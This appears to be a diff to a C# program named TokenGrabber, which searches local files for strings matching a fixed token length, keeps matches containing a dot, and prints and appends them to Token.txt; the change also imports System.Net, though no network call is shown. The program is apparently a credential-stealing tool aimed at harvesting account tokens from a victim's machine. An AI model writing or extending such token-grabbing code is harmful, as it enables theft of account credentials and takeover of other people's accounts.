@@ -2,6 +2,8 @@
 using System.IO;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
+using System.Net;
+
 
 namespace TokenGrabber
 {
@@ -24,6 +26,7 @@ namespace TokenGrabber
 
             GetToken();
 
+
             Console.WriteLine("----------End----------");
             Console.ReadLine();
 
@@ -40,10 +43,13 @@ namespace TokenGrabber
                 {
                     if (match.Length == tokenLength)
                     {
-                        Console.WriteLine($"Token = {match.ToString()}");
-                        using (StreamWriter sw = new StreamWriter("Token.txt", true))
+                        if (match.ToString().Contains("."))
                         {
-                            sw.WriteLine($"Token = {match.ToString()}");
+                            Console.WriteLine($"Token = {match.ToString()}");
+                            using (StreamWriter sw = new StreamWriter("Token.txt", true))
+                            {
+                                sw.WriteLine($"Token = {match.ToString()}");
+                            }
                         }
 
 
@@ -80,5 +86,6 @@ namespace TokenGrabber
             return files;
 
         }
+
     }
 }
